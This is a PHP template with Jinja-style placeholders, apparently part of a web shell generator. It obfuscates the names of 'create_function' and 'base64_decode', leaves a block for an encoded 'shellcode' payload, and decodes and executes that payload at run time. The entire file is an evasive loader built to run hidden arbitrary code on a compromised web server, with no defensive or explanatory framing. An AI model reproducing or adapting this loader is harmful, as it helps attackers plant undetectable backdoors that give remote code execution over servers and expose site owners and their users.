<?php
${{obfs.set('null')}}=null;
${{obfs.set('create_function_obfs')}}='{{obfs.pollute('create_function')}}';
${{obfs.set('create_function')}}=str_replace('{{obfs.depollute('create_function')}}',${{obfs.var('null')}},${{obfs.var('create_function_obfs')}});
${{obfs.set('base64_decode_obfs')}}='{{obfs.pollute('base64_decode')}}';
${{obfs.set('base64_decode')}}=str_replace('{{obfs.depollute('base64_decode')}}',${{obfs.var('null')}},${{obfs.var('base64_decode_obfs')}});
{% block shellcode %}{% endblock %}
${{obfs.set('exec')}}=${{obfs.var('create_function')}}(${{obfs.var('null')}},${{obfs.var('base64_decode')}}(${{obfs.var('shellcode')}}));
${{obfs.var('exec')}}();
